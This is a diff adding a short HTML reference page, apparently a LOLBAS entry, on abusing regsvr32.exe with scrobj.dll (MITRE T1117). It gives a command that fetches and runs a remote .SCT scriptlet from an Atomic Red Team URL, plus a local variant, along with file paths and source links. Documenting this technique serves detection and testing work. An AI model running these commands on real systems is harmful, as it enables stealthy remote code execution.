@@ -1,0 +1,40 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Regsvr</title>
+</head><body>Execute the specified remote .SCT script with scrobj.dll<br/>
+regsvr32.exe /s /n /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll<br/>
+<br/>
+Execute the specified local .SCT script with scrobj.dll.<br/>
+regsvr32.exe /s /u /i:file.sct scrobj.dll<br/>
+<br/>
+<br/>
+<ul>Windows binary: True</ul>
+<ul>Bypasses Default AppLocker Rules: False</ul>
+<ul>Mitre: <a href="https://attack.mitre.org/wiki/Technique/T1117">T1117</a></ul>
+<ul><li>Links:</li>
+</ul>
+<ul><li style="list-style-type: none"><ul><li><a href="https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/">https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</a></li>
+<li><a href="https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/">https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/</a></li>
+</ul>
+</li>
+</ul>
+<ul><li>File path:</li>
+</ul>
+<ul><li style="list-style-type: none"><ul><li>C:\Windows\System32\regsvr32.exe</li>
+<li>C:\Windows\SysWOW64\regsvr32.exe</li>
+</ul>
+</li>
+</ul>
+<ul><li>Acknowledgement:</li>
+</ul>
+<ul><li style="list-style-type: none"><ul><li>Name: Casey Smith</li>
+<li style="list-style-type: none"><ul><li>Twitter: <a href="https://twitter.com/@Subtee">@Subtee</a></li>
+<li>Blog: <a href="https://subt0x11.blogspot.com/">https://subt0x11.blogspot.com/</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+&nbsp;</body></html>
